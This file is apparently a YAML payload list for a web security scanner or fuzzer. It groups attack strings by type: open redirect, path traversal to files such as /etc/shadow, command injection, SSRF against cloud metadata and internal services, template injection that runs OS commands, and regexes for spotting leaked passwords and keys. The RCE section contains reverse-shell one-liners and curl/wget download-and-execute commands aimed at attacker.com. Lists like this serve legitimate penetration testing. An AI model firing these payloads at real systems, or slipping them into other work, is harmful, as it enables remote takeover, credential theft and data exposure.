open_redirect:
  - "https://evil.com"
  - "//evil.com"
  - "https://attacker.com"
  - "/%5Cevil.com"
  - "/%2F%2Fevil.com"
  - "//%5Cevil.com"
  - "//google.com/%5C..%5C..%5C..%5Cevil.com"
  - "https://google.com/%2F%2Fevil.com"

directory_traversal:
  - "/../../../../etc/passwd"
  - "/../../../../boot.ini"
  - "/..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
  - "/..%5c..%5c..%5c..%5cwindows%5csystem32%5ccmd.exe"
  - "../../../../../../../../etc/shadow"
  - "../../../../../../../../var/log/auth.log"
  - "../../../../../../../../etc/hosts"
  - "../../../../../../../../proc/self/environ"

command_injection:
  - "; whoami"
  - "&& whoami"
  - "| cat /etc/passwd"
  - "& cat /etc/shadow"
  - "|| ls -la"
  - "`id`"
  - "$(id)"
  - "$(sleep 5)"
  - "|| sleep 10 &"
  - "|| ping -c 5 127.0.0.1 &"

ssrf:
  - "http://169.254.169.254/latest/meta-data/"
  - "http://127.0.0.1:8080/admin"
  - "http://localhost:8000/"
  - "http://internal-service/"
  - "http://example.com@attacker.com"
  - "http://evil.com#@example.com"
  - "file:///etc/passwd"
  - "dict://127.0.0.1:25/"
  - "gopher://127.0.0.1:6379/_INFO"

rce:
  - "`whoami`"
  - "$(whoami)"
  - "`id`"
  - "&& id"
  - "| id"
  - "|| id"
  - "; nc -e /bin/sh attacker.com 4444"
  - "; bash -i >& /dev/tcp/attacker.com/4444 0>&1"
  - "; curl http://attacker.com/shell.sh | bash"
  - "; wget http://attacker.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh"

ssti:
  - "{{7*7}}"
  - "{{config.items()}}"
  - "{% for key, value in config.items() %} {{ key }}: {{ value }} {% endfor %}"
  - "{{''.__class__.__mro__[1].__subclasses__()}}"
  - "{{request.application.__globals__['os'].popen('id').read()}}"
  - "{{ self._TemplateReference__context.namespace['os'].popen('whoami').read() }}"

sensitive_data:
  - "(?i)password\\s?=\\s?[\"']?\\w+[\"']?"  
  - "(?i)apikey\\s?=\\s?[\"']?[a-zA-Z0-9-_]+"  
  - "(?i)authorization\\s?:\\s?[\"']?Bearer [a-zA-Z0-9-_]+"  
  - "(?i)secret\\s?=\\s?[\"']?\\w+[\"']?"  
  - "(?i)access_token\\s?=\\s?[\"']?\\w+[\"']?"  
  - "(?i)AWS_ACCESS_KEY_ID\\s?=\\s?[\"']?[A-Z0-9]+"  
  - "(?i)AWS_SECRET_ACCESS_KEY\\s?=\\s?[\"']?[a-zA-Z0-9/+=]+"  
  - "(?i)DB_PASSWORD\\s?=\\s?[\"']?\\w+[\"']?"  
  - "(?i)jwt\\s?=\\s?[\"']?[a-zA-Z0-9-_]+"  

